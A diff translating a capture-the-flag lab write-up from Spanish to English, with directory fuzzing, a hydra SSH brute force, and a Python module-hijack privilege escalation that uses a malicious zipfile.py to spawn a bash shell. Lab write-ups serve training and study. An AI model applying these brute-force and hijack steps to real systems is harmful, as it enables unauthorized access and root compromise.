@@ -17,9 +17,9 @@ PORT   STATE SERVICE VERSION
 ```
 
 
-## En la  pagina principal vemos 3 usuarios root , www-data y Anonymous que son 3 pisbles usuarios de el host victima 
+## On the main page we see 3 users: root, www-data and Anonymous which are 3 possible users of the victim host.
 
-## Fuzz 
+## Fuzzing
 ```bash
 gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak,old,sql,log,conf,ini -t 50
 ```
@@ -35,14 +35,14 @@ robots.txt           (Status: 200) [Size: 33]
 
 ___
 
-### Navegamos a robots.txt
+### We navigate to robots.txt
 **Output**
 ```
 User-agent: rockyou 
 Disallow: /
 ```
 
-### HMM si tenemos 1 posible usuario por ssh podremos obtener acceso al host on fuerza bruta
+### HMM if we have 1 possible ssh user we can gain access to the host by brute forcing
 
 ```bash
 hydra -L meliodas -P /usr/share/wordlists/rockyou.txt ssh://$TARGET -t 4 -V 
@@ -54,8 +54,8 @@ hydra -L meliodas -P /usr/share/wordlists/rockyou.txt ssh://$TARGET -t 4 -V
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-23 12:11:20
 ```
-### Tenemos aceso ssh 
-### Enumeramos 
+### We have SSH access
+### Enumeration
 ```bash
 ls 
 ls -lha
@@ -84,11 +84,12 @@ User meliodas may run the following commands on ubuntu:
     (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
 ```
 
-### La variable apth apunta primero a el home de melodias podemos crear una libreria falsa de python parqa que el script importe le modulo malicioso
+### The python path checks the current directory first, so we can create a fake python library to hijack the module import
+
 ```bash
 echo $PATH
 ```
-### Creamos modulo malicioso zipfile.py
+### Creating malicious module zipfile.py
 ```python
 import os
 import pty
@@ -119,7 +120,7 @@ pty.spawn("/bin/bash")
 s.close()
 ```
 
-### Ejecutamos
+### Execution
 ```bash
 sudo /usr/bin/python /home/meliodas/bak.py
 whoami 
